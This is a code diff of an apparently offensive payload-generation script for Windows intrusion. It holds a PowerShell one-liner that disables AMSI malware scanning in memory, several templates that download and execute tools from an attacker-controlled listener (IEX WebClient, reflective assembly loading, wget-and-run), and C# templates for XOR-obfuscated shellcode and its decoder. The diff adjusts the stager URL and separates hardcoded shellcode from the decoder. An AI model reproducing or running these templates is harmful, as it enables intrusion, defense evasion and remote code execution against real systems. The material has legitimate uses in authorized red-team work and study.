@@ -14,14 +14,13 @@ with open('config.yaml', 'r') as file:
   conf = yaml.safe_load(file)
 
 LHOST = ni.ifaddresses(conf['listener']['interface'])[ni.AF_INET][0]['addr']
-#LHOST = "10.10.10.10"	# Hardcode IP instead
 LPORT = conf['listener']['lport']
 WEBROOT = conf['listener']['webroot']
 
-STAGER_URL = f"http://{LHOST}/sc"
+STAGER_URL = f"https://{LHOST}/sc"
 PS_AMSI = r'''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'''
 PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/{tool}')"
-PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_class}]::{entrypoint}({cmd})'''
+PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_namespace}.{tool_classname}]::{entrypoint}({cmd})'''
 PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
 PS_UNZIP_CMD = "wget http://{LHOST}/{tool} -o C:\\\\windows\\\\tasks\\\\t.zip;Expand-archive -LiteralPath C:\\\\windows\\\\tasks\\\\t.zip -DestinationPath C:\\\\windows\\\\tasks\\\\"
 PS_EXE_DL = "wget http://{LHOST}/{tool} -o t.exe;.\\t.exe {cmd}"
@@ -131,8 +130,13 @@ URL_DL_CODE = """
 
 """
 
+# Hardcoded (stageless) shellcode
+SC_HARDCODED = """
+   byte[] shellcode = new byte[] {{ {xor_shellcode} }};
+"""
+
+# Decoder FOR XOR'd shellcode
 SC_XOR_DECODER = """
-  byte[] shellcode = new byte[] {{ {xor_shellcode} }};
   for (int i = 0; i < shellcode.Length; i++)
   {{
     shellcode[i] = (byte)(((uint)shellcode[i] ^ {xor_key}) & 0xFF);
